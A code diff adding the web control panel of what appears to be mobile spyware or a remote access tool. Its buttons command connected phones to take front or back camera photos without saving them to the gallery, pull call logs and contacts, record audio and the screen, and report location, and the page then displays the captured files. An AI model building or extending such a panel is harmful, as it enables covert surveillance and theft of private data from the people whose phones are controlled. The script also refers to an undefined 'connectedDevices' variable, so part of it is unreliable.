@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Control Panel</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #2c3e50, #34495e);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            padding: 20px;
+            background: #f8f9fa;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .main-content {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 20px;
+            padding: 20px;
+            min-height: 600px;
+        }
+
+        .devices-panel {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+        }
+
+        .devices-list {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .device-card {
+            background: white;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            border-left: 4px solid #3498db;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .device-card:hover {
+            transform: translateX(5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .device-card.active {
+            border-left-color: #e74c3c;
+            background: #fff5f5;
+        }
+
+        .control-panel {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+        }
+
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .command-btn {
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+
+        .command-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+
+        .command-btn.camera {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+        }
+
+        .command-btn.record {
+            background: linear-gradient(135deg, #9b59b6, #8e44ad);
+        }
+
+        .files-section {
+            margin-top: 20px;
+        }
+
+        .files-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .file-card {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .file-card img, .file-card video {
+            max-width: 100%;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+
+        .logs {
+            background: #2c3e50;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+        }
+
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 5px;
+            border-left: 3px solid #3498db;
+        }
+
+        .log-entry.success {
+            border-left-color: #2ecc71;
+        }
+
+        .log-entry.error {
+            border-left-color: #e74c3c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📱 Device Control Panel</h1>
+            <p>Real-time device management and control system</p>
+        </div>
+
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Connected Devices</h3>
+                <div id="connectedCount">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Total Commands</h3>
+                <div id="totalCommands">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Files Stored</h3>
+                <div id="totalFiles">0</div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="devices-panel">
+                <h3>📲 Connected Devices</h3>
+                <div id="devicesList" class="devices-list">
+                    <!-- Devices will be populated here -->
+                </div>
+            </div>
+
+            <div class="control-panel">
+                <h3>🎮 Device Controls</h3>
+                <div id="selectedDeviceInfo" style="margin-bottom: 20px; padding: 15px; background: #f8f9fa; border-radius: 8px;">
+                    Select a device to control
+                </div>
+
+                <div class="command-grid">
+                    <button class="command-btn camera" onclick="sendCommand('cam1')">📷 Front Camera</button>
+                    <button class="command-btn camera" onclick="sendCommand('cam2')">📸 Back Camera</button>
+                    <button class="command-btn" onclick="sendCommand('call_log')">📞 Call Log</button>
+                    <button class="command-btn" onclick="sendCommand('contacts')">👥 Contacts</button>
+                    <button class="command-btn record" onclick="sendCommand('record_audio')">🎤 Record Audio</button>
+                    <button class="command-btn record" onclick="sendCommand('record_screen')">📹 Record Screen</button>
+                    <button class="command-btn" onclick="sendCommand('location')">📍 Location</button>
+                    <button class="command-btn" onclick="sendCommand('device_info')">ℹ️ Device Info</button>
+                </div>
+
+                <div class="files-section">
+                    <h3>📁 Device Files</h3>
+                    <div id="filesGrid" class="files-grid">
+                        <!-- Files will be displayed here -->
+                    </div>
+                </div>
+
+                <div style="margin-top: 20px;">
+                    <h3>📋 Activity Log</h3>
+                    <div id="activityLogs" class="logs">
+                        <!-- Logs will appear here -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let selectedDeviceId = null;
+        let commandCount = 0;
+
+        // Socket event listeners
+        socket.on('connect', () => {
+            addLog('Connected to server', 'success');
+        });
+
+        socket.on('devices-updated', (devices) => {
+            updateDevicesList(devices);
+            document.getElementById('connectedCount').textContent = devices.length;
+        });
+
+        socket.on('command-response', (response) => {
+            addLog(`Device ${response.deviceId}: ${response.message}`, 
+                   response.success ? 'success' : 'error');
+            
+            if (response.success && response.data) {
+                refreshFiles();
+            }
+        });
+
+        socket.on('device-status-update', (data) => {
+            updateDeviceStatus(data);
+        });
+
+        // Functions
+        function updateDevicesList(devices) {
+            const devicesList = document.getElementById('devicesList');
+            devicesList.innerHTML = '';
+
+            devices.forEach(device => {
+                const deviceCard = document.createElement('div');
+                deviceCard.className = `device-card ${selectedDeviceId === device.deviceId ? 'active' : ''}`;
+                deviceCard.innerHTML = `
+                    <strong>${device.deviceName || 'Unknown Device'}</strong>
+                    <div style="font-size: 12px; color: #666;">ID: ${device.deviceId}</div>
+                    <div style="font-size: 11px; color: #999;">Connected: ${new Date(device.connectedAt).toLocaleTimeString()}</div>
+                `;
+                deviceCard.onclick = () => selectDevice(device.deviceId);
+                devicesList.appendChild(deviceCard);
+            });
+        }
+
+        function selectDevice(deviceId) {
+            selectedDeviceId = deviceId;
+            updateDevicesList(Array.from(connectedDevices || []));
+            
+            // Fetch device info
+            fetch(`/api/files/${deviceId}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        displayFiles(data.files);
+                    }
+                });
+
+            // Update device info display
+            const device = connectedDevices.get(deviceId);
+            if (device) {
+                document.getElementById('selectedDeviceInfo').innerHTML = `
+                    <strong>Selected Device:</strong> ${device.deviceName || device.deviceId}<br>
+                    <small>Last Seen: ${new Date(device.lastSeen).toLocaleString()}</small>
+                `;
+            }
+        }
+
+        function sendCommand(command) {
+            if (!selectedDeviceId) {
+                alert('Please select a device first');
+                return;
+            }
+
+            commandCount++;
+            document.getElementById('totalCommands').textContent = commandCount;
+
+            const parameters = {};
+            if (command.includes('cam')) {
+                parameters.quality = 'high';
+                parameters.saveToGallery = false;
+            }
+
+            fetch('/api/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    deviceId: selectedDeviceId,
+                    command: command,
+                    parameters: parameters
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    addLog(`Command sent: ${command}`, 'success');
+                } else {
+                    addLog(`Failed to send command: ${data.message}`, 'error');
+                }
+            })
+            .catch(error => {
+                addLog(`Error sending command: ${error.message}`, 'error');
+            });
+        }
+
+        function displayFiles(files) {
+            const filesGrid = document.getElementById('filesGrid');
+            filesGrid.innerHTML = '';
+            document.getElementById('totalFiles').textContent = files.length;
+
+            files.forEach(file => {
+                const fileCard = document.createElement('div');
+                fileCard.className = 'file-card';
+                
+                let content = '';
+                if (file.type.toLowerCase().match(/\.(jpg|jpeg|png|gif)$/)) {
+                    content = `<img src="${file.url}" alt="${file.filename}" style="max-height: 120px;">`;
+                } else if (file.type.toLowerCase().match(/\.(mp4|webm|mov)$/)) {
+                    content = `<video controls style="max-height: 120px;">
+                                <source src="${file.url}" type="video/mp4">
+                                Your browser does not support the video tag.
+                              </video>`;
+                } else {
+                    content = `<div style="font-size: 48px;">📄</div>`;
+                }
+
+                fileCard.innerHTML = `
+                    ${content}
+                    <div style="font-size: 12px; margin-top: 5px;">
+                        ${file.filename}<br>
+                        <small>${(file.size / 1024 / 1024).toFixed(2)} MB</small>
+                    </div>
+                `;
+                filesGrid.appendChild(fileCard);
+            });
+        }
+
+        function refreshFiles() {
+            if (selectedDeviceId) {
+                fetch(`/api/files/${selectedDeviceId}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            displayFiles(data.files);
+                        }
+                    });
+            }
+        }
+
+        function addLog(message, type = 'info') {
+            const logs = document.getElementById('activityLogs');
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry ${type}`;
+            logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logs.appendChild(logEntry);
+            logs.scrollTop = logs.scrollHeight;
+        }
+
+        // Initialize
+        addLog('System initialized. Waiting for devices...');
+        
+        // Load initial devices
+        fetch('/api/devices')
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    updateDevicesList(data.devices);
+                }
+            });
+    </script>
+</body>
+</html>
